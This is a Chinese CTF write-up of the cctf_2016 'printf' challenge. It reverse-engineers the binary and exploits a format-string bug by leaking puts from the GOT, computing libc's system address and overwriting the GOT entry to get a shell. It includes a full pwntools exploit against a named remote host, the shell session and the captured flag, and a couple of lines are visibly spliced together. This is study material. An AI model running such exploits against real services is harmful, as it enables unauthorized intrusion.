# title : printf writeup

# 题目描述
在实验吧上练习的第三道溢出类[题目](http://www.shiyanbar.com/ctf/2026)，题目来源为cctf_2016,通过这个题目，学习了格式化字符串漏洞的相关利用方式，在这里稍作记录。

# 分析题目
## 逆向分析
使用ida逆向分析其功能，程序主要功能为：
* 上传文件`put_file`
通过输入`文件名`及`文件内容`上传，程序会将二者存放到一个数组之中。
``` c
char *put_file()
{
  char *v0; // ST1C_4@1
  char *result; // eax@1

  v0 = (char *)malloc(0xF4u);
  printf("please enter the name of the file you want to upload:");
  get_input((int)v0, 40, 1);
  printf("then, enter the content:");
  get_input((int)(v0 + 40), 200, 1);
  *((_DWORD *)v0 + 60) = file_head;
  result = v0;
  file_head = (int)v0;
  return result;
}
```

* 获取文件内容`get_file`
通过输入文件名获取文件内容，输出的内容为文件上传功能中输入的数据。二者配合可触发fmt漏洞
``` c
int get_file()
{
  char dest; // [sp+1Ch] [bp-FCh]@5
  char s1; // [sp+E4h] [bp-34h]@1
  char *i; // [sp+10Ch] [bp-Ch]@3

  printf("enter the file name you want to get:");
  __isoc99_scanf("%40s", &s1);
  if ( !strncmp(&s1, "flag", 4u) )
    puts("too young, too simple");
  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )
  {
    if ( !strcmp(i, &s1) )
    {
      strcpy(&dest, i + 40);
      return printf(&dest);
    }
  }
  return printf(&dest);
}
```

* 列目录`show_dir`
使用`puts`函数将所有文件名打印出来
``` c
int show_dir()
{
  int v0; // eax@3
  char s[1024]; // [sp+14h] [bp-414h]@1
  int i; // [sp+414h] [bp-14h]@1
  int j; // [
通过前面的分析，sp+418h] [bp-10h]@1
  int v5; // [sp+41Ch] [bp-Ch]@1

  v5 = 0;
  j = 0;
  bzero(s, 0x400u);
  for ( i = file_head; i; i = *(_DWORD *)(i + 240) )
  {
    for ( j = 0; *(_BYTE *)(i + j); ++j )
    {
      v0 = v5++;
      s[v0] = *(_BYTE *)(i + j);
    }
  }
  return puts(s);
}
```
## 寻找漏洞
通过逆向分析，`put_file`环节可以向缓冲区中输入自定义字符串，`get_file`环节将这个字符串打印出来，如果在`put_file`中构造特定格式化字符串，那么`get_file`时就会造成格式化字符串漏洞，从而完成任意地址读和写。

## 利用思路
最终目的是想调用`system('/bin/sh')`,获取系统shell。存在问题有三个
1. `system`的address
2. `/bin/sh`如构造
3. 如何调用sysputs函数别的实际地址，最后计算出libc的地址

由于system位于libc中，所以只需要确定libc的加载地址即可，我们可以使用格式化字符串泄漏出其地址，注意到程序会多次调用put_file, get_file, show_dir,那么里面用到的函数将会放到got表中，puts函数在showdir里面反复调用，可以利用其got表获取其地址，再利用其偏移得到libc的地址，这样system的地址也就出来了。 然后可以将puts的got表覆盖为system的地址，并构造一个`/bin/sh`的文件名，再调用`show_dir`函数就可以完成漏洞利用。

# 构造exploit
通过前面的分析，需要做到下面两步即可完成利用：

* 泄漏system地址
* 覆盖puts函数地址为system地址，并使其参数包含`/bin/sh`

首先，使用`objdump`查询puts函数的`got`表:
``` bash
[root@bogon printf]# objdump -R pwn | grep puts
0804a028 R_386_JUMP_SLOT   puts
[root@bogon printf]#
```
得到其got表地址为`0x0804a028`

接着需要获取puts在libc中的偏移：
``` bash
[root@bogon printf]# objdump -T libc-2.23.so | grep puts
0005fca0 g    DF .text  000001d0  GLIBC_2.0   _IO_puts
0005fca0  w   DF .text  000001d0  GLIBC_2.0   puts
000ebb20 g    DF .text  00000491  GLIBC_2.0   putspent
000ed1d0 g    DF .text  00000291  GLIBC_2.10  putsgent
0005e720  w   DF .text  0000015d  GLIBC_2.0   fputs
0005e720 g    DF .text  0000015d  GLIBC_2.0   _IO_fputs
000680e0  w   DF .text  00000092  GLIBC_2.1   fputs_unlocked
[root@bogon printf]#

```
偏移为`0x5fca0`

然后可通过打印出got表中的地址，获取puts函数别的实际地址，最后计算出libc的地址

> addr_libc = addr_puts - offset_puts

紧接着计算出system地址

> addr_system = addr_libc + offset_system

然后通用`%n`进行任意地址写，将puts的got表覆盖为system的地址

最后构造的exploit如下：
``` python
#!/usr/bin/python
# @auther baseline
# github : https://github.com/windyware


from pwn import *

io = remote("121.194.2.42", 8001)

def put_file(io, name, content):
        io.recvuntil("ftp>")
        io.writeline("put")
        io.recvuntil(":")
        io.writeline(name)
        io.recvuntil(":")
        io.writeline(content)

def dir_file(io):
        io.recvuntil("ftp>")
        io.writeline("dir")

def get_file(io, name):
        io.recvuntil("ftp>")
        io.writeline("get")
        io.recvuntil(":")
        io.writeline(name)

def pwn(io):
        print 'exploit begin'
        username = ''.join([chr(ord(c)-1) for c in 'sysbdmin'])

        io.recvuntil('Name (ftp.hacker.server:Rainism):');
        io.writeline(username)

        got_malloc = 0x0804a024
        got_puts = 0x0804a028

        name = 'aaaa'
        #content =  p32(malloc_got)+'%6$s.'
        #content =  'A'*4+'B'*4+'C'*4+'%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x...'
        #content =  'A'*4+'B'*4+'C'*4+'%7$08x...'

        content = p32(got_puts)+'%7$s...'
        put_file(io, name, content)
        get_file(io, name)

        data = io.recvuntil('...')
        #print len(data)
        #print [c for c in data]

        addr_puts = u32(data[4:8])

        print 'puts_addr: ',hex(addr_puts)

        # get addr of libc by puts addr
        # addr_libc = addr_puts - offset_puts
        offset_puts = 0x0005fca0
        addr_libc = addr_puts - offset_puts


        # get addr of system by libc addr
        # addr_system = addr_libc + offset_system
        offset_system  = 0x0003ada0
        addr_system = addr_libc + offset_system
        #
        print 'system addr: '+hex(addr_system)
        addr_info = ''
        padding_info = ''
        system_addr_buff = p32(addr_system)
        offset = 4*4
        begin_index = 7
        for i in range(4):
                addr_info += p32(got_puts + i)
                val = ord(system_addr_buff[i])
                count = val - offset
                if count <= 0:
                        count += 0x100

                padding_info += "%%%dc"%count + "%%%d$hhn"%(begin_index + i)
                offset = val

        #print content
        name = '/bin/sh;'
        content = addr_info + padding_info
        put_file(io, name, content)

        get_file(io, name)

        dir_file(io)

        io.interactive()
        pass


pwn(io)

```


# 获取flag
运行exploit获取flag
``` bash
[root@bogon printf]# python pwn_printf.py
[+] Opening connection to 121.194.2.42 on port 8001: Done
exploit begin
puts_addr:  0xf75b3ca0
system addr: 0xf758eda0
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
run.sh
sbin
srv
sys
tmp
usr
var
$ cd home
$ ls
flag
pwn
$ cat flag
flag{ad942938834a3657d8dcf5279d749b8f}
$

```

# Referenced
1. https://www.anquanke.com/post/id/83818
2. https://www.anquanke.com/post/id/83835
3. http://blog.csdn.net/yuanyunfeng3/article/details/51419900
4. https://www.anquanke.com/post/id/85785
5. http://blog.csdn.net/qq_18661257/article/details/54694748
6. http://blog.csdn.net/koozxcv/article/details/51644476
 
